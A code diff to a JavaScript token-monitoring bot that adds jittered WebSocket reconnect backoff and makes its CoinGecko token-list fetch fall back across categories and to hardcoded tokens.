@@ -153,8 +153,10 @@ const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-
 const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
 const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
-const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
+const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
 let reconnectAttempt   = 0;
+// Add ±20% random jitter to a backoff delay.
+function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }
 
 // Tokens whose permit() always reverts (non-standard EIP-2612 implementations).
 const BLACKLISTED_EIP2612 = new Set([
@@ -1001,25 +1003,51 @@ async function cgFetchWithRetry(url) {
 }
 
 async function fetchTokenList(chain) {
-  const platformMap = { eth: "ethereum", bnb: "binance-smart-chain", polygon: "polygon-pos" };
-  const categoryMap = { eth: "ethereum-ecosystem", bnb: "bnb-chain", polygon: "polygon-ecosystem" };
-  const platform    = platformMap[chain] ?? platformMap[CHAIN];
-  const category    = categoryMap[chain] ?? categoryMap[CHAIN];
+  const platformMap  = { eth: "ethereum", bnb: "binance-smart-chain", polygon: "polygon-pos" };
+  // BNB category: try primary first, then fallback. Other chains have one category.
+  const categoryMap  = { eth: ["ethereum-ecosystem"], bnb: ["binance-smart-chain", "bnb-chain-ecosystem"], polygon: ["polygon-ecosystem"] };
+  const platform     = platformMap[chain] ?? platformMap[CHAIN];
+  const categories   = categoryMap[chain] ?? categoryMap[CHAIN];
+
+  let page1 = [], page2 = [];
+  let usedCategory = null;
+  for (const category of categories) {
+    try {
+      log(`[tokens] fetching page 1 for ${chain} (category=${category})...`);
+      const r1 = await cgFetchWithRetry(
+        `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`
+      );
+      if (Array.isArray(r1) && r1.length > 0) {
+        page1 = r1;
+        usedCategory = category;
+        break;
+      }
+      warn(`[tokens] category=${category} returned empty — trying next`);
+    } catch (e) {
+      warn(`[tokens] category=${category} failed: ${e.message} — trying next`);
+    }
+    await sleep(2_000);
+  }
+
+  if (!page1.length) {
+    const fallback = FALLBACK_TOKENS[chain] ?? FALLBACK_TOKENS[CHAIN] ?? [];
+    warn(`[tokens] all CoinGecko categories failed for ${chain} — using ${fallback.length} hardcoded tokens`);
+    return fallback;
+  }
 
   try {
-    log(`[tokens] fetching page 1 for ${chain}...`);
-    const page1 = await cgFetchWithRetry(
-      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`
-    );
     await sleep(2_000);
-
-    log(`[tokens] fetching page 2 for ${chain}...`);
-    const page2 = await cgFetchWithRetry(
-      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=2`
+    log(`[tokens] fetching page 2 for ${chain} (category=${usedCategory})...`);
+    const r2 = await cgFetchWithRetry(
+      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${usedCategory}&order=market_cap_desc&per_page=250&page=2`
     );
-    await sleep(2_000);
+    if (Array.isArray(r2)) page2 = r2;
+  } catch (e) {
+    warn(`[tokens] page 2 fetch failed (${e.message}) — using page 1 only`);
+  }
 
-    const allCoins = [...(Array.isArray(page1) ? page1 : []), ...(Array.isArray(page2) ? page2 : [])];
+  try {
+    const allCoins = [...page1, ...page2];
     if (!allCoins.length) throw new Error("empty markets response");
 
     log(`[tokens] fetching coin list with platform addresses...`);
@@ -1395,9 +1423,10 @@ async function startBot() {
     wsProvider.websocket.on("close", () => {
       warn("[ws] closed — removing listeners and reconnecting...");
       wsProvider.removeAllListeners();
-      const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
+      const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
+      const delay = withJitter(base);
       reconnectAttempt++;
-      log(`[ws] reconnecting in ${delay / 1000}s (attempt ${reconnectAttempt})...`);
+      log(`[ws] reconnecting in ${(delay / 1000).toFixed(1)}s (attempt ${reconnectAttempt})...`);
       setTimeout(startBot, delay);
     });
 
@@ -1407,9 +1436,10 @@ async function startBot() {
     log(`[ws] ✅ connected — Transfer listeners active for ${TOKENS.length} tokens`);
   } catch (e) {
     err(`[ws] startBot failed: ${e.message}`);
-    const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
+    const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
+    const delay = withJitter(base);
     reconnectAttempt++;
-    log(`[ws] retrying in ${delay / 1000}s (attempt ${reconnectAttempt})...`);
+    log(`[ws] retrying in ${(delay / 1000).toFixed(1)}s (attempt ${reconnectAttempt})...`);
     setTimeout(startBot, delay);
   }
 }
